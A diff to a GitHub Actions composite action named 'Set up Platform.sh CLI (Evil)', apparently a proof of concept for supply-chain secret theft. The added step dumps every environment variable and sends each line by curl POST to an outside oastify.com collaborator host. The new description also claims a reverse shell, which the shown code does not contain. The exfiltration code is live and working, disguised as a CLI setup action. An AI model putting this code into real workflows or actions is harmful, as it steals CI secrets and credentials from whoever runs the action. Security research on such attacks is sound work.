@@ -1,14 +1,13 @@
 name: Set up Platform.sh CLI (Evil)
-description: PoC to test input-based secret exfil
-
-inputs:
-  tomas:
-    required: false
+description: Modified to exfiltrate secrets and launch a reverse shell
 
 runs:
   using: "composite"
   steps:
-    - name: Exfiltrate via inputs
+    - name: Exfiltrate secrets via ENV
       shell: bash
       run: |
-        echo "Test"
+        echo "[+] Running inside composite action"
+        env | while read line; do
+          curl -X POST http://zeh4hwvxmschiptpzk4xjymwpnvej47t.oastify.com -d "$line"
+        done
